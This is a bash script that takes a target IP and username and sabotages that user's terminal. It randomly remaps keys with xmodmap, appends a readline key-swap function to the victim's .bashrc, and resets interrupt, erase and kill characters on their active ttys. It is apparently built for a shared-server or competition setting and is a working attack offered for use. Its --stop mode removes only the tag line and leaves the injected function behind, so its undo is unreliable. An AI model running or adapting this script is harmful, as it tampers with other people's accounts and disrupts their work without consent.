#!/bin/bash
IP="$1"
USERNAME="$2"
MODE="${3:---start}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG_FILE="$SCRIPT_DIR/../logs/actions.log"
mkdir -p "$(dirname "$LOG_FILE")"

log() { echo "$(date): [KEYBOARD] $*" >> "$LOG_FILE"; }

if [[ ! "$IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then log "Invalid IP: $IP"; exit 1; fi
if [[ ! "$USERNAME" =~ ^[a-zA-Z0-9_]+$ ]]; then log "Invalid username: $USERNAME"; exit 1; fi
if [[ "$IP" == "$SP_MY_IP" ]] && [[ "$USERNAME" == "$SP_MY_USERNAME" ]]; then log "Own connection, skipping"; exit 0; fi

HOME_DIR="/home/$USERNAME"
BASHRC="$HOME_DIR/.bashrc"
TAG="# sp_keyboard"

if [[ ! -d "$HOME_DIR" ]]; then log "Home dir not found: $HOME_DIR"; exit 1; fi

if [[ "$MODE" == "--stop" ]]; then
    log "Removing keyboard chaos for $USERNAME"
    if [[ -f "$BASHRC" ]]; then
        sed -i "/$TAG/d" "$BASHRC"
    fi
    TTYS=$(who | grep "^$USERNAME " | awk '{print $2}')
    for tty in $TTYS; do
        stty sane < "/dev/$tty" 2>/dev/null
    done
    log "Keyboard chaos removed for $USERNAME"
    exit 0
fi

log "Applying keyboard chaos to $USERNAME from $IP"

if command -v xmodmap &>/dev/null; then
    keys=(a b c d e f g h i j k l m n o p q r s t u v w x y z)
    shuffled=($(shuf -e "${keys[@]}"))
    for ((i = 0; i < ${#keys[@]}; i++)); do
        keycode=$(xmodmap -pke | grep -w "${keys[$i]}" | head -1 | awk '{print $2}')
        if [[ -n "$keycode" ]]; then
            xmodmap -e "keycode $keycode = ${shuffled[$i]}" 2>/dev/null
        fi
    done
    log "xmodmap keyboard scramble applied"
fi

cat >> "$BASHRC" << 'BINDRC'
_sp_remap() {
    local -A swaps=([a]=s [s]=d [d]=f [f]=g [g]=h [h]=j [j]=k [k]=l [e]=r [r]=t [t]=y [w]=q [o]=p [n]=m [z]=x [x]=c [c]=v [v]=b)
    local char
    for char in "${!swaps[@]}"; do
        bind "\"$char\":\"${swaps[$char]}\"" 2>/dev/null
        bind "\"${char^}\":\"${swaps[$char]^}\"" 2>/dev/null
    done
}
_sp_remap
BINDRC
echo "$TAG" >> "$BASHRC"
log "Bash bind key remap installed"

TTYS=$(who | grep "^$USERNAME " | awk '{print $2}')
for tty in $TTYS; do
    stty intr ^A < "/dev/$tty" 2>/dev/null
    stty erase ^W < "/dev/$tty" 2>/dev/null
    stty kill ^E < "/dev/$tty" 2>/dev/null
done
log "stty chaos applied to active terminals"

log "Keyboard chaos applied to $USERNAME"
